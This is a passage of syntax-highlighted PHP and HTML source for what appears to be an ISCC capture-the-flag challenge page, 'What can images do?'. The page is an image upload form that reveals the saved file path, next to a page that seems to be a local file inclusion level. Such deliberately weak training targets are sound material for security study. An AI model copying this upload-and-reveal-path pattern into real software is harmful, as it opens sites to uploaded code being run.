punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'active open'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'active'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include_once</span> <span class="token string">'inc/uploadfunction.php'</span><span class="token punctuation">;</span>

<span class="token variable">$html</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//指定类型</span>
    <span class="token variable">$mime</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'image/jpg'</span><span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$save_path</span><span class="token operator">=</span><span class="token string">'uploads'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'/Y/m/d/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//根据当天日期生成一个文件夹</span>
    <span class="token variable">$upload</span><span class="token operator">=</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string">'uploadfile'</span><span class="token punctuation">,</span><span class="token string">'512000'</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用函数</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">[</span><span class="token string">'return'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p class='notice'>success！&lt;/p>&lt;p class='notice'>文件保存的路径为：{$upload['save_path']}&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p class=notice>{$upload['error']}&lt;/p>"</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">ISCC</span> <span class="token operator">|</span> What can images <span class="token keyword">do</span><span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
    body<span class="token punctuation">{</span>background<span class="token operator">-</span>image<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token keyword">static</span><span class="token operator">/</span>background<span class="token punctuation">.</span>jpg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

    html<span class="token punctuation">,</span>body<span class="token punctuation">{</span>
    position<span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
    height<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content<span class="token punctuation">{</span>
    position<span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
    width<span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>
    margin<span class="token punctuation">:</span> 80px auto<span class="token punctuation">;</span>
    padding<span class="token punctuation">:</span> 20px 40px 40px<span class="token punctuation">;</span>
    text<span class="token operator">-</span>align<span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    background<span class="token punctuation">:</span> <span class="token shell-comment comment">#fff;</span>
    border<span class="token punctuation">:</span> 1px solid <span class="token shell-comment comment">#ccc;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content<span class="token punctuation">:</span><span class="token punctuation">:</span>before<span class="token punctuation">,</span><span class="token punctuation">.</span>main<span class="token operator">-</span>content<span class="token punctuation">:</span><span class="token punctuation">:</span>after<span class="token punctuation">{</span>
    content<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
    position<span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>height<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
    top<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">.</span>5px<span class="token punctuation">;</span>left<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    background<span class="token punctuation">:</span> <span class="token shell-comment comment">#fff;</span>
    z<span class="token operator">-</span>index<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>webkit<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>moz<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>ms<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    border<span class="token punctuation">:</span> 1px solid <span class="token shell-comment comment">#ccc;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content<span class="token punctuation">:</span><span class="token punctuation">:</span>after<span class="token punctuation">{</span>
    top<span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
    z<span class="token operator">-</span>index<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>webkit<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token operator">-</span>moz<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">-</span>ms<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content1<span class="token punctuation">{</span>
    position<span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
    width<span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>
    margin<span class="token punctuation">:</span> 80px auto<span class="token punctuation">;</span>
    padding<span class="token punctuation">:</span> 20px 40px 40px<span class="token punctuation">;</span>
    text<span class="token operator">-</span>align<span class="token punctuation">:</span> center<span class="token punctuation">;</span>
    background<span class="token punctuation">:</span> <span class="token shell-comment comment">#fff;</span>
    border<span class="token punctuation">:</span> 1px solid <span class="token shell-comment comment">#ccc;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content1<span class="token punctuation">:</span><span class="token punctuation">:</span>before<span class="token punctuation">,</span><span class="token punctuation">.</span>main<span class="token operator">-</span>content<span class="token punctuation">:</span><span class="token punctuation">:</span>after<span class="token punctuation">{</span>
    content<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
    position<span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    width<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>height<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
    top<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">.</span>5px<span class="token punctuation">;</span>left<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    background<span class="token punctuation">:</span> <span class="token shell-comment comment">#fff;</span>
    z<span class="token operator">-</span>index<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>webkit<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>moz<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>ms<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span>4deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    border<span class="token punctuation">:</span> 1px solid <span class="token shell-comment comment">#ccc;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span>main<span class="token operator">-</span>content1<span class="token punctuation">:</span><span class="token punctuation">:</span>after<span class="token punctuation">{</span>
    top<span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
    z<span class="token operator">-</span>index<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token operator">-</span>webkit<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token operator">-</span>moz<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">-</span>ms<span class="token operator">-</span>transform<span class="token punctuation">:</span> <span class="token function">rotateZ</span><span class="token punctuation">(</span><span class="token operator">-</span>2deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>main-content-inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>page-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usu_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span>  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>
                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>uploadfile<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span>  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>uploadfile<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>
                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sub<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>点击上传<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
                <span class="token delimiter">&lt;?php</span>
                <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出了上传文件的路径</span>
                <span class="token delimiter">?></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.page-content --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- /.main-content --></span></span>

<span class="token delimiter">&lt;?php</span>

<span class="token variable">$SELF_PAGE</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SELF_PAGE</span> <span class="token operator">=</span> <span class="token string">"fi_local.php"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ACTIVE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'active open'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'active'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token 